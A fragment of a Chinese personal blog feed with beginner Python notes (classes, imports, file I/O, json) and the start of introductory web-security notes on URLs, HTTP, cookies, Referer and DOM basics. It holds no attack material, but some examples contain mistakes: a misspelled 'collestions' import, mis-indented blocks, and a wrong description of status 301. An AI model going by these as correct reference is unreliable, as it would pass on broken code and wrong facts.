class="string">&#x27;tesla&#x27;</span>, <span class="string">&#x27;model s&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br><span class="line">my_tesla.battery.describe_battery() </span><br><span class="line">my_tesla.battery.get_range()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Tesla Model S</span><br><span class="line">This car has a 70-kWh battery.</span><br><span class="line">This car can go approximately 240 miles on a full charge.</span><br></pre></td></tr></table></figure>

<h3 id="导入类"><a href="#导入类" class="headerlink" title="导入类"></a>导入类</h3><h4 id="导入单个类"><a href="#导入单个类" class="headerlink" title="导入单个类"></a>导入单个类</h4><blockquote>
<p>from 文件名 import 类名</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;一个可用于表示汽车的类&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;返回整洁的描述性名称&quot;&quot;&quot;</span></span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条消息，指出汽车的里程&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将里程表读数设置为指定的值</span></span><br><span class="line"><span class="string">        拒绝将里程表往回拨</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">        	self.odometer_reading = mileage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        	<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;将里程表读数增加指定的量&quot;&quot;&quot;</span></span><br><span class="line">        self.odometer_reading += miles</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#my_car.py</span></span><br><span class="line"><span class="keyword">from</span> car <span class="keyword">import</span> Car</span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>, <span class="string">&#x27;a4&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.odometer_reading = <span class="number">23</span></span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Audi A4</span><br><span class="line">This car has 23 miles on it.</span><br></pre></td></tr></table></figure>

<h4 id="从一个模块中导入多个类"><a href="#从一个模块中导入多个类" class="headerlink" title="从一个模块中导入多个类"></a>从一个模块中导入多个类</h4><blockquote>
<p>from 模块名  import   类名,类名</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#my_cars.py</span></span><br><span class="line"><span class="keyword">from</span> electric_car <span class="keyword">import</span> Car,ElectricCar</span><br><span class="line"></span><br><span class="line">my_beetle = Car(<span class="string">&#x27;volkswagen&#x27;</span>, <span class="string">&#x27;beetle&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_beetle.get_descriptive_name())</span><br><span class="line"></span><br><span class="line">my_tesla = ElectricCar(<span class="string">&#x27;tesla&#x27;</span>, <span class="string">&#x27;roadster&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Volkswagen Beetle</span><br><span class="line">2016 Tesla Roadster</span><br></pre></td></tr></table></figure>

<h4 id="导入模块以及模块中的所有类"><a href="#导入模块以及模块中的所有类" class="headerlink" title="导入模块以及模块中的所有类"></a>导入模块以及模块中的所有类</h4><blockquote>
<p><strong>导入整个模块：</strong></p>
<p>import 模块名</p>
<p><strong>导入模块中的所有类：</strong></p>
<p>from module_name import *</p>
</blockquote>
<h3 id="Python标准库"><a href="#Python标准库" class="headerlink" title="Python标准库"></a>Python标准库</h3><blockquote>
<p>推荐几个查看Python标准库的网址：</p>
<p><a href="https://docs.python.org/zh-cn/3/library/index.html">Python官网的标准库</a></p>
<p><a href="https://www.runoob.com/python3/python3-stdlib.html">菜鸟教程的标准库</a></p>
</blockquote>
<p>一、<strong>collestions</strong>库中的OrderedDict方法</p>
<blockquote>
<p>OrderedDict()创建一个有序字典，它记录了键值对添加的顺序</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collestions <span class="keyword">import</span> OrderedDict</span><br><span class="line"><span class="comment">#将字典的键和值的顺序进行记录</span></span><br><span class="line">favorite_languages = OrderedDict()</span><br><span class="line"><span class="comment">#调用OrderedDict()函数创建favorite_languages空字典</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;jen&#x27;</span>] = <span class="string">&#x27;python&#x27;</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;sarah&#x27;</span>] = <span class="string">&#x27;c&#x27;</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;edward&#x27;</span>] = <span class="string">&#x27;ruby&#x27;</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;phil&#x27;</span>] = <span class="string">&#x27;python&#x27;</span></span><br><span class="line"><span class="keyword">for</span> name, language <span class="keyword">in</span> favorite_languages.items():</span><br><span class="line">    <span class="built_in">print</span>(name.title() + <span class="string">&quot;&#x27;s favorite language is &quot;</span> +language.title() + <span class="string">&quot;.&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jen<span class="string">&#x27;s favorite language is Python.</span></span><br><span class="line"><span class="string">Sarah&#x27;</span>s favorite language is C.</span><br><span class="line">Edward<span class="string">&#x27;s favorite language is Ruby.</span></span><br><span class="line"><span class="string">Phil&#x27;</span>s favorite language is Python.</span><br></pre></td></tr></table></figure>

<p>二、random库中的randint()方法</p>
<blockquote>
<p>randint()返回一个位于指定范围内的整数</p>
</blockquote>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="从文件中读取数据"><a href="#从文件中读取数据" class="headerlink" title="从文件中读取数据"></a>从文件中读取数据</h3><blockquote>
<p>**open( ‘files_name’)**打开文件并且返回一个文件对象，注意，该文件和当前执行的文件所在目录相同，如若不同则应该写入文件路径：</p>
<p><strong>Linux 和OS X系统中的文件路径用’&#x2F;‘斜杆</strong></p>
<p>with open(‘text_files&#x2F;filename.txt’) as file_object:</p>
<p><strong>Windows系统中文件路径用’\‘反斜杠</strong></p>
<p>with open(‘text_files\filename.txt’) as file_object:</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;files_name.txt&#x27;</span>) <span class="keyword">as</span> file_objecta:<span class="comment">#files_name需要带上文件后缀</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;关键字with，让Python负责妥善地打开和关闭文件。&quot;&quot;&quot;</span></span><br><span class="line">	contents = file_object.read()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;file_object.read()调用读取函数读取文件中的内容&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(contents.rstrip())<span class="comment">#rstrip会删除字符串末尾的字符</span></span><br></pre></td></tr></table></figure>

<h4 id="逐行读取"><a href="#逐行读取" class="headerlink" title="逐行读取"></a>逐行读取</h4><blockquote>
<p>**for line in file_object:**利用循环进行逐行读取文件内容</p>
</blockquote>
<blockquote>
<p><strong>pi_digits.txt</strong></p>
<p>3.1415926535<br>    8979323846<br>    2643383279</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file_object:</span><br><span class="line">	<span class="built_in">print</span>(line.rstrip())</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">3.1415926535</span><br><span class="line">  8979323846</span><br><span class="line">  2643383279</span><br></pre></td></tr></table></figure>

<h4 id="创建一个包含文件各行内容的列表"><a href="#创建一个包含文件各行内容的列表" class="headerlink" title="创建一个包含文件各行内容的列表"></a>创建一个包含文件各行内容的列表</h4><blockquote>
<p>lines &#x3D; file_object.readlines()<br>#调用readlines()函数将文件的各行存储在创建的列表中</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">	lines = file_object.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="built_in">print</span>(line.rstrip())</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">3.1415926535</span><br><span class="line">  8979323846</span><br><span class="line">  2643383279</span><br></pre></td></tr></table></figure>

<h4 id="使用文件里的内容"><a href="#使用文件里的内容" class="headerlink" title="使用文件里的内容"></a>使用文件里的内容</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pi_string.py</span></span><br><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    lines = file_object.readlines()</span><br><span class="line">pi_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">	pi_string += line.strip()</span><br><span class="line"><span class="built_in">print</span>(pi_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pi_string))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">3.141592653589793238462643383279</span><br><span class="line">32</span><br></pre></td></tr></table></figure>

<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><blockquote>
<p> <u><strong>with open(filename,’a’) as file_object:</strong></u>#以附加模式打开文件</p>
<p><strong><u><em>模式：</em></u></strong></p>
<p>​	<strong>#读取模式‘r’</strong></p>
<p>​	<strong>#写入模式’w,’打开前清空文件内容</strong></p>
<p>​	<strong>#附加模式’a’</strong></p>
<p>​	<strong>#读取和写入模式’r+’</strong></p>
<p><strong><u>file_object.write(“需要写入的内容”)</u></strong></p>
<p>注意：</p>
<p><strong>Python只能将字符串写入文本文件。要将数值数据存储到文本文件中，必须先使用函数str()将其转换为字符串格式。</strong></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#write_messages.py</span></span><br><span class="line">filename = <span class="string">&#x27;programming.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">&quot;I love programming.\n&quot;</span>)</span><br><span class="line">	file_object.write(<span class="string">&quot;敬请T期待@&quot;</span>)</span><br><span class="line">    file_object.write(<span class="string">&quot;KingWempity&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>programming.txt</p>
<blockquote>
<p>I love programming.<br>敬请T期待@KingWempity</p>
</blockquote>
<h3 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h3><blockquote>
<p>使用json模块来存储数据</p>
<p><strong>通常使用文件扩展名.json来指出文件存储的数据为JSON格式。</strong></p>
</blockquote>
<h4 id="json-dump"><a href="#json-dump" class="headerlink" title="json.dump()"></a>json.dump()</h4><blockquote>
<p>函数json.dump()接受两个实参：要存储的数据以及可用于存储数据的文件对象。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#number_writer.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">numbers = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br><span class="line">filename = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    json.dump(numbers, f_obj)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">先导入模块json，再创建一个数字列表。我们指定了要将该数字列表存储到其中的文件的名称。通常使用文件扩展名.json来指出文件存储的数据为JSON格式。接下来，我们以写入模式打开这个文件，让json能够将数据写入其中。我们使用函数json.dump()将数字列表存储到文件numbers.json中。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>打开文件numbers.json</p>
<blockquote>
<p>[2, 3, 5, 7, 11, 13]</p>
</blockquote>
<h4 id="json-load"><a href="#json-load" class="headerlink" title="json.load()"></a>json.load()</h4><blockquote>
<p>函数json.load()加载存储在filename.json中的信息</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#number_reader.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">filename = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">	numbers = json.load(f_obj)</span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[2, 3, 5, 7, 11, 13]</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#remember_me.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">username = <span class="built_in">input</span>(<span class="string">&quot;What is your name? &quot;</span>)</span><br><span class="line">filename = <span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">	json.dump(username, f_obj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;We&#x27;ll remember you when you come back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What is your name? Eric</span><br><span class="line">We<span class="string">&#x27;ll remember you when you come back, Eric!</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greet_user.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">filename = <span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">	username = json.load(f_obj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Welcome back, Eric!</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#remember_me.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 如果以前存储了用户名，就加载它</span></span><br><span class="line"><span class="comment"># 否则，就提示用户输入用户名并存储它</span></span><br><span class="line">filename = <span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">        username = json.load(f_obj)</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&quot;What is your name? &quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    	json.dump(username, f_obj)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;We&#x27;ll remember you when you come back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>首次运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What is your name? Eric</span><br><span class="line">We<span class="string">&#x27;ll remember you when you come back, Eric!</span></span><br></pre></td></tr></table></figure>

<p>否则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Welcome back, Eric!</span><br></pre></td></tr></table></figure>







<p><strong>至此，本书第一部分基础知识已基本完结撒花❀❀❀</strong></p>
<p>🎇🎇🎇</p>
<p>推荐几个个版本python知识学习的网址</p>
<blockquote>
<p><a href="https://www.runoob.com/python3/python3-tutorial.html">菜鸟教程Python3</a></p>
<p><a href="https://www.cainiaojc.com/python/python-tutorial.html">菜鸟教程Python</a></p>
<p>虽然都是菜鸟教程，但因为版本问题，版本界面有些许变化，笔者更适应第一个，因人而异，最适合自己的才是最好的！</p>
<p><a href="https://docs.python.org/zh-cn/3/index.html">Python.org</a></p>
<p>Python官网的文档，里面有一切想要了解的东西！教程、标准库、语言参考、安装用法……</p>
<p>笔者不才，如有错误还望读者指正，后续会更新评论版块，欢迎大家留言指正！！！</p>
<p>敬请T期待！</p>
<p>感谢各位读者朋友的支持和理解！❀❀❀</p>
</blockquote>
]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>python</tag>
        <tag>Learn</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_白帽子</title>
    <url>/2024/01/25/Web-%E7%99%BD%E5%B8%BD%E5%AD%90/</url>
    <content><![CDATA[<h2 id="Web基础介绍"><a href="#Web基础介绍" class="headerlink" title="Web基础介绍"></a>Web基础介绍</h2><blockquote>
<p>知识点罗列：</p>
<ul>
<li>URL概念、结构格式</li>
<li>HTTP报文结构</li>
<li>cookie含义</li>
<li>Set-cookie含义</li>
<li>Referer的作用</li>
<li>状态码301和302的含义</li>
<li>Location的含义</li>
</ul>
</blockquote>
<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><blockquote>
<p>统一资源定位符（Uniform Resource Locator）</p>
</blockquote>
<blockquote>
<p>作用：定位服务器资源</p>
</blockquote>
<blockquote>
<p>URL格式：schemna:&#x2F;&#x2F;host[:post#]&#x2F;path&#x2F;…&#x2F;[?query-string][#anchor]</p>
<p>schemna	底层协议(例如：http,https,ftp…)</p>
<p>host		  服务器的域名或IP地址</p>
<p>:post 		服务器的端口，HTTP默认端口是80(可省略)，其他端口需要指明</p>
<p>&#x2F;path&#x2F;…&#x2F;	访问资源的路径</p>
<p>？query-string 发送给http服务器的数据</p>
<p>[#anchor]	 锚</p>
</blockquote>
<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><blockquote>
<p>超文本传输协议（Hyper Text Transfer Protocol）</p>
</blockquote>
<blockquote>
<p>作用：Web通信时使用的协议</p>
</blockquote>
<blockquote>
<ol>
<li><p>HTTP报文</p>
<p>HTTP报文是用于HTTP协议交互的信息，HTTP报文本身是由多行数据构成的字符串文本。客户端的HTTP报文叫做请求报文，服务器端的HTTP报文叫做响应报文。</p>
</li>
<li><p>HTTP报文结构</p>
<p><img src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="http报文结构"></p>
<p><strong>报文首部</strong>是客户端或服务器端需处理的<code>请求或响应</code>的内容及属性， 可以传递额外的重要信息。报文首部包括请求行和请求头部。</p>
<p>空行</p>
<p><strong>报文主体</strong>主要包含应被发送的数据。通常，不一定有报文主体。</p>
</li>
<li><p>HTTP请求报文结构</p>
<p><img src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="HTTP请求报文结构"></p>
<p>GET和POST的区别：</p>
<blockquote>
<p>（1）get是从服务器上获取数据（即下载），post是向服务器传送数据（即上传）。<br>（2）生成方式不同：<br>Get：URL输入；超连接；Form表单中method属性为get；Form表单中method为空。<br>Post只有一种：Form表单中method为Post。<br>（3）数据传送方式：Get传递的请求数据按照key-value的方式放在URL后面，在网址中可以直接看到，使用?分割URL和传输数据，传输的参数之间以&amp;相连，如：login.action?name&#x3D;user&amp;password&#x3D;123。所以安全性差。<br>POST方法会把请求的参数放到请求头部和空格下面的请求数据字段就是请求正文（请求体）中以&amp;分隔各个字段，请求行不包含参数，URL中不会额外附带参数。所以安全性高。<br>（3）发送数据大小的限制：通常GET请求可以用于获取轻量级的数据，而POST请求的内容数据量比较庞大些。<br>Get：1~2KB。get方法提交数据的大小直接影响到了URL的长度，但HTTP协议规范中其实是没有对URL限制长度的，限制URL长度的是客户端或服务器的支持的不同所影响。<br>Post：没有要求。post方式HTTP协议规范中也没有限定，起限制作用的是服务器的处理程序的能力。<br>（4）提交数据的安全：POST比GET方式的安全性要高。Get安全性差，Post安全性高。<br>通过GET提交数据，用户名和密码将明文出现在URL上，如果登录页面有浏览器缓存，或者其他人查看浏览器的历史记录，那么就可以拿到用户的账号和密码了。安全性将会很差。</p>
</blockquote>
</li>
<li><p>HTTP响应报文结构</p>
<p><img src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E5%93%8D%E5%BA%94%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="HTTP响应报文结构"></p>
</li>
</ol>
<hr>
<p>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p>
<p>参考文章</p>
<p>原文链接：<a href="https://blog.csdn.net/qq_35887546/article/details/104216286">https://blog.csdn.net/qq_35887546/article/details/104216286</a></p>
</blockquote>
<blockquote>
<p>HTTP请求的方式</p>
<p>–GET</p>
<p>–POST</p>
<p>–HEAD				 与GET请求类似，不同在于与服务器只返回HTTP头部信息，没有页面内容</p>
<p>–PUT					上传指定URL的描述</p>
<p>–DELETE			 删除指定资源</p>
<p>–OPTIONS 		 返回服务器支持的HTTP方法</p>
</blockquote>
<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><blockquote>
<p>cookie:相当于用户的凭证，类似与用户的通行证，很重要。</p>
<p>set-cookie:服务器要求浏览器设置cookie</p>
</blockquote>
<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><blockquote>
<p>Referer的作用：</p>
<p>–告知服务器该请求的来源（浏览器自动加上）</p>
<p>–统计流量</p>
<p>–判断来源合法性：防止盗链，防止CSRF漏洞</p>
</blockquote>
<h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><blockquote>
<p>Location：跳转到地址</p>
</blockquote>
<h3 id="响应报文状态码"><a href="#响应报文状态码" class="headerlink" title="响应报文状态码"></a>响应报文状态码</h3><blockquote>
<p>响应报文状态码</p>
<p><strong>3</strong>：完成此请求必须进一步处理**</p>
<p>301——删除请求数据</p>
<p>302——在其他地址发现了请求数据</p>
<hr>
<p>详细状态码：<a href="https://blog.csdn.net/qq_35887546/article/details/104216807">https://blog.csdn.net/qq_35887546/article/details/104216807</a></p>
</blockquote>
<h2 id="前端开发基础知识"><a href="#前端开发基础知识" class="headerlink" title="前端开发基础知识"></a>前端开发基础知识</h2><blockquote>
<p>知识点罗列：</p>
<p>​	–JavaScript</p>
<p>​	–DOM</p>
<p>​	–BOM</p>
</blockquote>
<h3 id="javaScript"><a href="#javaScript" class="headerlink" title="javaScript"></a>javaScript</h3><blockquote>
<p>javaScript运行位置：</p>
<ul>
<li>HTML的<script></script></li>
<li>HTML的事件属性中</li>
<li>浏览器中的JavaScript控制台中的Console中</li>
</ul>
</blockquote>
<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><blockquote>
<p>DOM本质：链接Web页面和编程语言</p>
<p>JavaScript + DOM：访问和操作HTML文档的标准方法</p>
</blockquote>
<blockquote>
<p>获取一个HTML元素内容</p>
<ul>
<li><p>tep1：获取元素</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>()<span class="comment">//获取元素</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>tep2：获取元素的内容</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="property">innerHTML</span><span class="comment">//获取元素的内容</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>tep3：显示获取信息</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>).<span class="property">innerHTML</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>alert()方法在JavaScript中表示弹出一个警告框，可以用来展示信息</strong></p>
</li>
</ul>
</blockquote>
<p>示例</p>
<blockquote>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">          Hello!敬请T期待</span><br><span class="line">       <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;intro&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">       <span class="title function_">alert</span>(<span class="string">&#x27;id为intro元素的文本是：&#x27;</span>+x.<span class="property">innerHTML</span>);  </span></span><br><span class="line"><span class="language-javascript">       </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>修改一个HTML元素</p>
<ul>
<li><p>tep1：获取元素</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>tep2：获取元素内容</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="property">innerHTML</span></span><br></pre></td></tr></table></figure></li>
</ul>
</blockquote>
<p>示例</p>
<blockquote>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">          Hello!敬请T期待</span><br><span class="line">       <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       x=<span class="variable 